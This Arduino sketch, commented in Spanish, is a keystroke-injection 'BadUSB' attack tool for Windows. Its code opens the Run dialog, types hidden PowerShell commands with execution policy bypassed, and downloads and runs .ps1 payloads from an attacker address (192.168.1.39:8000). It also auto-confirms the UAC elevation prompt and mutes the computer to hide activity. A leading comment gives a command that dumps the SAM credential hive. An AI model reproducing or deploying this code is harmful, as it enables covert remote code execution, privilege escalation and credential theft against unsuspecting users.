#include <Keyboard.h>
//powershell -Command "$var=[char]92; reg save ('HKLM'+$var+'SAM') hola2.dmp" (guarda \ en una variable y dumpea la sam)


//Teclado LAT=1 | Teclado ESP=2
int Teclado=1;


void Normal_enter() { //Enter sin admin
  Keyboard.press(KEY_RETURN);//presiona suelta la tecla enter
  Keyboard.release(KEY_RETURN);//suelta tecla lo antes posible
}
void Eje_Admin(){ //Enter con admin
  Keyboard.press(KEY_LEFT_CTRL);//turn on admin privileges
  Keyboard.press(KEY_LEFT_SHIFT); //Click shift izquierdo
  Keyboard.press(KEY_RETURN);//presiona suelta la tecla enter
  Keyboard.releaseAll();//suelta teclas lo antes posible
}
String mute_unmute(){
  if(Teclado==1){
    return "powershell /Command *New/Object /ComObject WScript.Shell(.SendKeys*\"char|173("; //"powershell -Command (New-Object -ComObject WScript.Shell).SendKeys([char]173)"  powershell /Command *New/Object /ComObject WScript.Shell(.SendKeys*\"char|173(
  }
  else if(Teclado==2){
    return "powershell -Command (New-Object -ComObject WScript.Shell).SendKeys([char]173)"; 
  }
  //este es el string completo, sirve para enviar al ordenador el char concreto necesario para silenciarlo sin tener encuenta el teclado
}

void Gestion_ruido(){
   String comando_silencio="";
   if(Teclado==1){
   comando_silencio= "cmd &c start &min cmd &c " + mute_unmute();//Abre pestaña oculta para silenciar PC
   }
   else if(Teclado==2){
   comando_silencio= "cmd /c start /min cmd /c " + mute_unmute();//Abre pestaña oculta para silenciar PC
   }
   for (int i = 0; i < comando_silencio.length(); ++i) {
    Keyboard.write(comando_silencio[i]); //Printea cada tecla 1 a 1
    delay(1);//delay necesario para que el ordenador procese la tecla enviada por arduino (1 decima)
   }
    Normal_enter();
    delay(200);//Delay necesario para darle tiempo al ordenador a abrir la terminal para poder pasar a la siguiente tarea
}
void Abrir_ejecutar(){
  Keyboard.press(KEY_LEFT_GUI);// Presionar tecla de Windows
  Keyboard.press('r');// Presionar tecla 'r' para abrir la pestaña de ejecución
  Keyboard.releaseAll();// soltar todas las teclas
  delay(200);//delay necesario para que al sistema le de tiempo a abrir ejecutar
}

void Gestion_Enter(bool admin, bool admin_espera,bool sin_ruido){
  if(!admin){ //Si se tiene que ejecutar sin admin
    Normal_enter(); //Presiona enter
  }
  else if(!admin_espera){ //Si se tiene que ejecutar con admin y sin esperar 
    Eje_Admin(); //Presiona teclas necesarias para ejecutar panel admin
    delay(2000); //Tiempo necesario para abrir el panel "Desea ejecutar esto"
    //Se dice que si
    Keyboard.press(KEY_LEFT_ARROW);//Presiona flecha izquierda
    Keyboard.release(KEY_LEFT_ARROW);//Suelta flecha izquierda
    Keyboard.press(KEY_RETURN);//Presiona enter
    Keyboard.release(KEY_RETURN); //Suelta enter
  }
  else{ //Si se tiene que ejecutar con admin y esperando
    Eje_Admin();//Ejecuta admin y espera que el usuario diga que si, si no ne se ejecutara el comando
    if(sin_ruido){ //Aviso IMPORTANTE, si se aplica sin_ruido, junto con admin espera la ejecucion puede fallar gravemente, ya si el usuario no presiona una de las opciones antes de que acabe el tiempo, el programa proseguira y dejara el codigo powershell para desilenciar a la vista
      delay(299800); //Tiempo necesario para abrir el panel "Desea ejecutar esto" (Se espera, ya que si no el siguiente comando no funcionara porque se esta abriendo el UAC)
    }
  }
}
String creacion_comando(String comando, bool oculto, bool autocierre, bool sin_ruido, bool admin){
  //cmd /c start /min cmd /c "comando" (se cierra automaticamente la pestaña y cmd /c start /min cmd /K "comando" para que no se cierre automaticamente  comando para ejecutar de manera oculta
  String comando_fabricado= "";
  if(Teclado==1){
    if(oculto && autocierre){ //Si el comnado se tiene que ejecutar en oculto y con autocierre
      comando_fabricado = comando_fabricado + "&c start &min cmd &c " + "powershell /WindowStyle Hidden " + comando; //&c start &min cmd &c powershell /WindowStyle Hidden
    }
    else if(oculto && !autocierre){ //Si el comando se tiene que ejecutar en pestaña minimizada y sin autocierre
      comando_fabricado = comando_fabricado + "&c start &min cmd &K " + "powershell " + comando; //&c start &min cmd &K powershell -Command
    }
    else{ //Si el comnado no se ejecuta ni en oculto ni con autocierre
      comando_fabricado = comando_fabricado + "&K " + "powershell " + comando;
    }
    if(admin && sin_ruido){ //Si el comando se tiene que ejecutar sin ruido
      Gestion_ruido();
      Abrir_ejecutar();
    }
  }
  else if(Teclado==2){
    if(oculto && autocierre){ //Si el comnado se tiene que ejecutar en oculto y con autocierre
      comando_fabricado = comando_fabricado + "/c start /min cmd /c " + "powershell -WindowStyle Hidden " + comando; //&c start &min cmd &c powershell /WindowStyle Hidden
    }
    else if(oculto && !autocierre){ //Si el comando se tiene que ejecutar en pestaña minimizada y sin autocierre
      comando_fabricado = comando_fabricado + "/c start /min cmd /K " + "powershell " + comando; //&c start &min cmd &K powershell -Command
    }
    else{ //Si el comnado no se ejecuta ni en oculto ni con autocierre
      comando_fabricado = comando_fabricado + "/K " + "powershell " + comando;
    }
    if(admin && sin_ruido){ //Si el comando se tiene que ejecutar sin ruido
      Gestion_ruido();
      Abrir_ejecutar();
    }
  }
  return comando_fabricado;
}

void Gestion_admin(String comando,  bool oculto, bool autocierre, bool sin_ruido, bool admin, bool admin_espera){
  //Iniciamos ejecución de ejecutar
  Abrir_ejecutar();
  
  //Preparamos comando para ejecutar
  String comando_fabricado= "cmd "; //Todos los comandos empiezan por cmd
  comando_fabricado = comando_fabricado + creacion_comando(comando, oculto, autocierre, sin_ruido, admin); //Gestiona el comando a crear segun las opciones
  for (int i = 0; i < comando_fabricado.length(); ++i) { //Printeo de comando en ejecutar
    Keyboard.write(comando_fabricado[i]);//Printea cada tecla 1 a 1
    delay(1);//delay necesario para que el ordenador procese la tecla enviada por arduino (1 decima)
  }
  Gestion_Enter(admin, admin_espera, sin_ruido); //Administra si se ejcutara terminal admin o no y de que forma 
  delay(200);//Delay necesario para darle tiempo al ordenador a abrir la terminal para poder pasar a la siguiente tarea
  if(admin && sin_ruido){//Si antes se silencio el ordenador, abre otro ejecutar y lo desilencia
    Abrir_ejecutar();
    Gestion_ruido();
  }
}
void Seleccion_ejecucion(String* lista,int i,int j,bool k,bool l,bool m){
  if(i==0 || i==1 || i==3){
    //comando requiere ejecución no privilegiada
      switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, false, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, false, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, false, l);
          break;
    }
  }
  else if(i==4){
      //comando requiere ejecución privilegiada
      switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, true, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, true, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, true, l);
          break;
    }
  }
  else if(i==2){
    //comando con privilegios de admin/usuario seleccionables
    switch (j) {
        case 1:
          Gestion_admin(lista[i], true, true, k, m, l);
          break;
        case 2:
          Gestion_admin(lista[i], true, false, k, m, l);
          break;
        case 3:
          Gestion_admin(lista[i], false, false, k, m, l);
          break;
    }
  }
}
void Selector_payload(String* lista){
  //Aquí habria la logica de la pantalla para seleccionar las diferentes opciones
  int i=4;//numero de comando seleccionado
  int j=1;//Tipo de terminal seleccionada (oculta, no oculta, con minimizar, sin minimizar...)
  bool k=false;//Variable para determinar ruido Con ruido = false, sin ruido = true
  bool l=true; //Admin espera=true, Admin sin espera=false (solo para programas admin)
  bool m=false; //Con admin o sin admin (solo para programas que se puedan aplicar las 2)
  Seleccion_ejecucion(lista,i,j,k,l,m);
} 
void setup() {
  //En ejecutar maximo 259 caracteres
  String Attack_IP_download="192.168.1.39";
  String Attack_Port="8000";
  String Comandos_LAT[] = {"/Command @echo hola; echo -adios-@","/Command @echo -Hola como estas- ` Out/File /FilePath C>&Windows&Temp&temp3.txt /Force@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp.ps1 /OutFile temp.ps1< .&temp.ps1@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp1.ps1 /OutFile temp1.ps1< .&temp1.ps1@","/ExecutionPolicy Bypass /Command @cd &Windows&Temp< Invoke/WebRequest /Uri http>&&"+Attack_IP_download+">"+Attack_Port+"&temp2.ps1 /OutFile temp2.ps1< .&temp2.ps1@"};
  String Comandos_ESP[] = {"-Command echo hola; echo 'adios'","-Command echo 'Hola como estas' | powershell -Command Out-File -FilePath C:/Windows/Temp/temp3.txt -Force","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp.ps1 -OutFile temp.ps1; ./temp.ps1","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp1.ps1 -OutFile temp1.ps1; ./temp1.ps1","-ExecutionPolicy Bypass -Command cd /Windows/Temp; Invoke-WebRequest -Uri http://"+Attack_IP_download+":"+Attack_Port+"/temp2.ps1 -OutFile temp2.ps1; ./temp2.ps1"};
  //pinMode(LED_BUILTIN, OUTPUT);
  //digitalWrite(LED_BUILTIN, HIGH);
  switch (Teclado) {
    case 1:
      Keyboard.begin();//comienzo de simulación de teclado
      delay(500);//delay necesario para que funcionen las siguientes intrucciones (si no no se ejecuta el windows + r)
      Selector_payload(Comandos_LAT);
      break;
    case 2:
      Keyboard.begin(KeyboardLayout_es_ES);//comienzo de simulación de teclado
      delay(500);//delay necesario para que funcionen las siguientes intrucciones (si no no se ejecuta el windows + r)
      Selector_payload(Comandos_ESP);
      break;
  }
  Keyboard.end();//fin del programa
  //digitalWrite(LED_BUILTIN, LOW);
}
//cmd /c start /min cmd /c powershell -WindowStyle Hidden "echo 'Hola como estas' + Out-File -FilePath C:/Windows/Temp/temp4.txt -Force"
void loop() {
  // No hay código en el loop en este ejemplo
}


//cmd /c start "" /min cmd /c powershell -WindowStyle Hidden "echo 'Hola como estas' | Out-File -FilePath C:/Windows/Temp/temp3.txt -Force"&&  powershell -Command (New-Object -ComObject WScript.Shell).SendKeys([char]173
